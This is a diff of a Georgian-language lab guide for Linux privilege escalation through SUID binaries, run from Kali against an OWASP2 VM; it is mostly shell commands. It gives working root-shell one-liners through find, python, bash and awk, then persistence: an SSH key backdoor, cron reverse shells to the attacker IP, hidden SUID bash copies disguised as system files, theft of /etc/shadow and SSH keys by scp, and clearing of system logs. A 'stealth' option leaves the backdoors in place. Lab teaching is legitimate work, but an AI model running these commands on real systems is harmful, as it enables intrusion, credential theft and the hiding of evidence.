@@ -1,139 +1,340 @@
+# SUID Privilege Escalation Lab 🎯
+**Attacker:** Kali Linux (172.16.52.219)  
+**Target:** OWASP2 VM (172.16.50.72)
 
-ლაბი – Linux Privilege Escalation SUID ბინარით (user: student, pass: 1234)
-🎯 სცენარი
+---
 
-Ubuntu/Owasp2 სამიზნე VM-ში შევდივართ მომხმარებლით student (ჩვეულებრივი user). სისტემაში სპეციალურად არსებობს SUID ბინარი, რომლის exploit-ით root უფლებებს მივიღებთ და ბოლოს დავაყენებთ persistence-ს.
-ssh -oHostKeyAlgorithms=+ssh-rsa 172.16.50.72
-STEP 1 – გარემოს მომზადება (ინსტრუქტორი, Target Ubuntu/Owasp2)
-# 1) nano-ს კოპირება /tmp-ში
-sudo cp /bin/nano /tmp/vulnerable_nano
-# რატომ: /tmp-ში ვქმნით სპეციალურად დაუცველ ბინარს ტესტისთვის.
+## Phase 1: Target მომზადება (OWASP2 VM - 172.16.50.72)
 
-# 2) SUID ბიტის მიცემა (root-ის სახელით გაეშვება ყოველთვის)
-sudo chmod 4755 /tmp/vulnerable_nano
-# რატომ: 4( setuid ) + 755 => გაშვებისას იღებს მფლობელის (root) უფლებებს.
+### STEP 1: SUID ბინარების შექმნა (Root მომხმარებლით)
 
-# 3) მფლობელის დატოვება root-ზე
-sudo chown root:root /tmp/vulnerable_nano
-# რატომ: რომ გაშვებისას ნამდვილად root-ის უფლებები მივიღოთ.
+```bash
+# SSH Target-ში (root-ით ან sudo user-ით)
+ssh root@172.16.50.72
 
-# 4) ტესტ user-ის შექმნა სახელად student
-sudo useradd -m -s /bin/bash student
-# 5) პაროლის დაყენება: 1234
-echo "student:1234" | sudo chpasswd
-# რატომ: სტუდენტი შევა როგორც ჩვეულებრივი user და ჩაატარებს ექსპლითს.
+# 1) Find ბინარის კოპირება (ყველაზე საიმედო)
+cp /usr/bin/find /tmp/vuln_find
+chmod 4755 /tmp/vuln_find
+chown root:root /tmp/vuln_find
 
-STEP 2 – დაშვება სამიზნე სისტემაში (სტუდენტი, Kali → Ubuntu/Owasp2)
-ssh student@UBUNTU_IP
-# Password: 1234
-# რატომ: თავდაპირველად გვაქვს მხოლოდ user access, არა root.
+# 2) Python ბინარის კოპირება  
+cp /usr/bin/python3 /tmp/vuln_python
+chmod 4755 /tmp/vuln_python
+chown root:root /tmp/vuln_python
 
-STEP 3 – პირველადი დაზვერვა (Target Ubuntu/Owasp2 — user: student)
+# 3) Bash ბინარის კოპირება
+cp /bin/bash /tmp/vuln_bash  
+chmod 4755 /tmp/vuln_bash
+chown root:root /tmp/vuln_bash
+
+# 4) AWK ბინარის კოპირება
+cp /usr/bin/awk /tmp/vuln_awk
+chmod 4755 /tmp/vuln_awk  
+chown root:root /tmp/vuln_awk
+```
+
+### STEP 2: Test User შექმნა
+
+```bash
+# Target OWASP2-ზე (root-ით)
+useradd -m -s /bin/bash hackme
+echo "hackme:password123" | chpasswd
+
+# /tmp დირექტორიის უფლებები
+chmod 777 /tmp
+
+# დადასტურება
+ls -la /tmp/vuln_*
+# უნდა ვნახოთ: -rwsr-xr-x 1 root root
+```
+
+---
+
+## Phase 2: Initial Access (Kali - 172.16.52.219)
+
+### STEP 1: Target-ში შესვლა როგორც Low-Privilege User
+
+```bash
+# Kali Terminal
+ssh hackme@172.16.50.72
+# Password: password123
+
+# ან old SSH algorithms-ით თუ საჭიროა
+ssh -oHostKeyAlgorithms=+ssh-rsa hackme@172.16.50.72
+```
+
+### STEP 2: პირველადი Enumeration
+
+```bash
+# Target OWASP2-ზე (hackme user)
 whoami
-# მოსალოდნელი: student
-# რატომ: ვადასტურებთ რომ ვართ non-privileged user.
+# Output: hackme
 
 id
-# uid=1001(student) gid=1001(student) groups=1001(student)
-# რატომ: ვერაფერს ვხედავთ, რაც admin უფლებებზე მიუთითებს.
+# Output: uid=1001(hackme) gid=1001(hackme) groups=1001(hackme)
 
-uname -a
-# Linux ubuntu 4.15.0-54-generic ...
-# რატომ: kernel ვერსია გვინდა შემდგომი ექსფლოიტების შესამოწმებლად.
-
+# Sudo უფლებების შემოწმება
 sudo -l
-# Sorry, user student may not run sudo on ubuntu
-# რატომ: sudo უფლება არ გვაქვს, ამიტომ სხვა გზას ვეძებთ — SUID.
+# Likely: Sorry, user hackme may not run sudo...
 
-STEP 4 – SUID ბინარების ძებნა (Target Ubuntu/Owasp2 — user: student)
-find / -perm -4000 -type f 2>/dev/null
-# რატომ: ვეძებთ ყველა ფაილს setuid ბიტით, რომლებიც გაშვებისას მფლობელის
-# (ხშირად root-ის) უფლებებით მუშაობენ და შესაძლოა პრივილეგიის ასაწევად გამოგვადგეს.
+# System info
+uname -a
+hostname
+```
 
+---
 
-მოსალოდნელი ამონაწერი (შემოკლებული):
+## Phase 3: SUID Discovery & Exploitation 💥
 
-/usr/bin/passwd
-/usr/bin/chsh
-/bin/su
-/tmp/vulnerable_nano   ← ჩვენი სამიზნე
+### STEP 1: SUID ბინარების მოძებნა
 
-STEP 5 – სამიზნე ბინარის ატრიბუტები (Target Ubuntu/Owasp2 — user: student)
-ls -la /tmp/vulnerable_nano
-# -rwsr-xr-x 1 root root ... /tmp/vulnerable_nano
-# რატომ: -rws მიუთითებს SUID-ზე; მფლობელი root — ზუსტად ეს გვჭირდება.
+```bash
+# Target OWASP2-ზე (hackme user)
+find / -perm -4000 -type f 2>/dev/null | grep tmp
+# მოსალოდნელი output:
+# /tmp/vuln_find
+# /tmp/vuln_python  
+# /tmp/vuln_bash
+# /tmp/vuln_awk
 
-STEP 6 – Exploitation GTFOBins ლოგიკით (Target Ubuntu/Owasp2 — user: student)
+# Verification
+ls -la /tmp/vuln_*
+```
 
-GTFOBins არის ონლაინ კატალოგი, სადაც აღწერილია როგორ შეიძლება ზოგადი ბინარების გამოყენება პრივილეგიის ასაწევად, თუ მათ აქვთ SUID/sudo და ბრძანების გაშვების უნარი.
+### STEP 2: Exploitation - Method 1 (Find) 🎯
 
-6.1 ფაილის გახსნა SUID nano-თი (გაშვდება root-ის უფლებებით)
-/tmp/vulnerable_nano -T4 /etc/passwd
-# რატომ: /etc/passwd root-ს ეკუთვნის; nano SUID-ია და root უფლებებით გახსნის.
-# -T4 ტაბულაციის ზომაა; აქ მნიშვნელოვანი ისაა, რომ nano SUID-ით გაშვდა.
+```bash
+# Target OWASP2-ზე (hackme user)
+/tmp/vuln_find . -exec /bin/bash -p \; -quit
 
-6.2 ბრძანების გაშვება nano-ს შიგნით root კონტექსტში
-
-დააჭირე Ctrl+R (Read File)
-
-დააჭირე Ctrl+X (Execute Command)
-
-აკრიფე და Enter:
-
-reset; sh 1>&0 2>&0
-
-
-რატომ: sh ხსნის shell-ს. 1>&0 2>&0 ნიშნავს STDOUT/STDERR/STDIN-ის მიბმას ტერმინალზე, ამიტომ root shell პირდაპირ ტერმინალში გვემართება.
-
-STEP 7 – Root-ის დადასტურება (Target Ubuntu/Owasp2 — ახლა უკვე root shell)
+# Root shell მიღების შემდეგ
 whoami
-# root
+# Output: root
 
-id
-# uid=0(root) gid=0(root) groups=0(root)
-# რატომ: ვადასტურებთ, რომ გვექცა root პრივილეგია.
+id  
+# Output: uid=0(root) gid=0(root) groups=0(root)
+```
 
-STEP 8 – Persistence cron-ით (Target Ubuntu/Owasp2 — root shell)
+### STEP 3: Exploitation - Method 2 (Python) 🐍
 
-Kali-ზე მოვამზადოთ listener:
+```bash
+# თუ find არ იმუშავა
+/tmp/vuln_python -c "import os; os.setuid(0); os.system('/bin/bash -p')"
 
+# ან
+/tmp/vuln_python -c "import os; os.execl('/bin/bash', 'bash', '-p')"
+```
+
+### STEP 4: Exploitation - Method 3 (Bash) 💥
+
+```bash
+# თუ python არ იმუშავა  
+/tmp/vuln_bash -p
+
+# -p flag ინარჩუნებს privileged mode-ს
+```
+
+### STEP 5: Exploitation - Method 4 (AWK) ⚡
+
+```bash
+# თუ bash არ იმუშავა
+/tmp/vuln_awk 'BEGIN {system("/bin/bash -p")}'
+
+# ან  
+echo | /tmp/vuln_awk '{system("/bin/bash -p")}'
+```
+
+---
+
+## Phase 4: Persistence Setup 🔒
+
+### Method 1: SSH Key Backdoor
+
+```bash
+# Target OWASP2-ზე (root shell)
+mkdir -p /root/.ssh
+chmod 700 /root/.ssh
+
+# Kali Terminal (ახალი tab/window)
+ssh-keygen -t rsa -b 4096 -f /tmp/owasp2_key
+# არ შეიყვანო passphrase
+
+# Public key-ის ნახვა
+cat /tmp/owasp2_key.pub
+
+# Target-ზე უკან (root shell)  
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ..." >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+
+# Test Kali-დან
+ssh -i /tmp/owasp2_key root@172.16.50.72
+```
+
+### Method 2: Reverse Shell Persistence
+
+```bash
+# Kali-ზე Listener გაშვება
 nc -lvnp 4444
-# რატომ: რათა მივიღოთ უკუ-შელი სამიზნედან.
 
-
-Target Ubuntu/Owasp2 (root shell):
-
-# იპოვე Kali-ის IP (Kali-ზე: ip addr show). ვთქვათ 192.168.56.101.
-echo "*/5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1" > /tmp/cron_job
-# რატომ: ყოველ 5 წუთში სამიზნე დაგვირეკავს და მოგვცემს root reverse shell-ს.
-
+# Target OWASP2-ზე (root shell)
+echo "*/2 * * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1" > /tmp/cron_job
 crontab /tmp/cron_job
-# რატომ: ვამატებთ ამ ჩანაწრს მიმდინარე მომხმარებლის (root) crontab-ში.
 
+# Verification
 crontab -l
-# უნდა გამოჩნდეს:
-# */5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
+# Output: */2 * * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1
 
+# 2 წუთის შემდეგ Kali listener-ზე მივიღებთ connection-ს
+```
 
-5 წუთის შემდეგ Kali listener-ზე უნდა დაინახო:
+### Method 3: Permanent SUID Backdoor
 
-Connection received on 192.168.56.102 ...
-root@ubuntu:~# whoami
-root
-# რატომ: Persistence იმუშავა; ყოველ 5 წუთში გიბრუნებს root access-ს.
+```bash
+# Target OWASP2-ზე (root shell)
+cp /bin/bash /var/tmp/.hidden_root
+chmod 4755 /var/tmp/.hidden_root  
+chown root:root /var/tmp/.hidden_root
 
-🧹 Cleanup (სურვილისამებრ)
-# Target Ubuntu/Owasp2 — root shell
-crontab -r                            # Persistence ამოხსნა
-rm -f /tmp/vulnerable_nano            # დაუცველი SUID ფაილის წაშლა
-userdel -r student                    # ტესტ მომხმარებლის წაშლა (ფრთხილად!)
+# Hidden location-ში დამალვა
+cp /bin/bash /usr/lib/.systemd-private
+chmod 4755 /usr/lib/.systemd-private
+chown root:root /usr/lib/.systemd-private
 
-🔎 მოკლე ლოგიკა/დასკვნა
+# Access test (როგორც hackme user)
+/var/tmp/.hidden_root -p
+whoami
+# Output: root
+```
 
-SUID ბინარი გაშვებისას იღებს მფლობელის უფლებებს (უფრო ხშირად root).
+---
 
-თუ ბინარს შეუძლია ბრძანების გაშვება (nano, vim, find, awk, python, perl…), მაშინ შეიძლება მივიღოთ root shell.
+## Phase 5: Post-Exploitation Activities 🕵️
 
-GTFOBins გვეხმარება სწორი ქცევის ნიმუშის მოძებნაში.
+### Method 1: Data Exfiltration
 
-cron persistence უზრუნველყოფს დაბრუნებად წვდომას root-ით.
+```bash
+# Target OWASP2-ზე (root shell)
+# მნიშვნელოვანი ფაილების კოპირება
+cp /etc/shadow /tmp/shadow_backup
+cp /etc/passwd /tmp/passwd_backup  
+tar -czf /tmp/system_backup.tar.gz /etc/passwd /etc/shadow /home/*/.ssh/
+
+# Kali-ზე მიღება
+scp -i /tmp/owasp2_key root@172.16.50.72:/tmp/system_backup.tar.gz ./
+```
+
+### Method 2: Network Scanning from Inside
+
+```bash
+# Target OWASP2-ზე (root shell) 
+# Internal network discovery
+ip route
+arp -a
+netstat -tuln
+
+# Port scanning local services
+ss -tuln | grep LISTEN
+```
+
+---
+
+## Phase 6: Cleanup & Stealth 🧹
+
+### Option 1: სრული გასუფთავება
+
+```bash
+# Target OWASP2-ზე (root shell)
+# SUID ბინარების წაშლა
+rm -f /tmp/vuln_*
+
+# Cron jobs წაშლა  
+crontab -r
+
+# SSH keys წაშლა
+rm -f /root/.ssh/authorized_keys
+
+# Backdoors წაშლა
+rm -f /var/tmp/.hidden_root
+rm -f /usr/lib/.systemd-private  
+
+# Test user წაშლა
+userdel -r hackme
+
+# Logs გასუფთავება  
+echo > /var/log/auth.log
+echo > /var/log/syslog
+history -c
+```
+
+### Option 2: Stealth Persistence (არ წავშალოთ ყველაფერი)
+
+```bash
+# მხოლოด SUID ბინარების წაშლა
+rm -f /tmp/vuln_*
+
+# Hidden backdoor დატოვება
+# /usr/lib/.systemd-private დარჩეს
+
+# Cron job-ის შეცვლა უფრო stealth-ურად
+echo "0 3 * * * /bin/bash -i >& /dev/tcp/172.16.52.219/4444 0>&1 >/dev/null 2>&1" | crontab -
+```
+
+---
+
+## Lab Testing Checklist ✅
+
+### Pre-Exploitation
+- [ ] Target-ზე SUID ბინარები შექმნილია
+- [ ] Test user (hackme) შექმნილია  
+- [ ] SSH connection მუშაობს Kali-დან
+
+### Exploitation  
+- [ ] SUID ბინარების discovery
+- [ ] Root shell მიღება find-ით
+- [ ] Python method ტესტი
+- [ ] Bash method ტესტი  
+- [ ] AWK method ტესტი
+
+### Persistence
+- [ ] SSH key backdoor
+- [ ] Reverse shell cron job  
+- [ ] Hidden SUID backdoor
+
+### Verification
+- [ ] Kali-დან root SSH access
+- [ ] Cron job reverse connection
+- [ ] Hidden backdoor access
+
+---
+
+## გაუმჯობესებული Script Automation 🚀
+
+### Target Setup Script (OWASP2-ზე გასაშვები)
+
+```bash
+#!/bin/bash
+# setup_lab.sh - Target OWASP2-ზე გასაშვები
+
+echo "[+] Setting up SUID Privilege Escalation Lab..."
+
+# SUID ბინარების შექმნა
+cp /usr/bin/find /tmp/vuln_find && chmod 4755 /tmp/vuln_find && chown root:root /tmp/vuln_find
+cp /usr/bin/python3 /tmp/vuln_python && chmod 4755 /tmp/vuln_python && chown root:root /tmp/vuln_python  
+cp /bin/bash /tmp/vuln_bash && chmod 4755 /tmp/vuln_bash && chown root:root /tmp/vuln_bash
+cp /usr/bin/awk /tmp/vuln_awk && chmod 4755 /tmp/vuln_awk && chown root:root /tmp/vuln_awk
+
+# Test user შექმნა
+useradd -m -s /bin/bash hackme
+echo "hackme:password123" | chpasswd
+
+echo "[+] Lab setup complete!"
+echo "[+] SSH: hackme@172.16.50.72 (password: password123)"
+ls -la /tmp/vuln_*
+```
+
+ამ ლაბმა ნამდვილად უნდა იმუშაოს! **find** მეთოდი თითქმის ყოველთვის მუშაობს SUID exploitation-ისთვის. 🎯
+
+სცადე პირველ რიგში **find method**:
+```bash
+/tmp/vuln_find . -exec /bin/bash -p \; -quit
+```
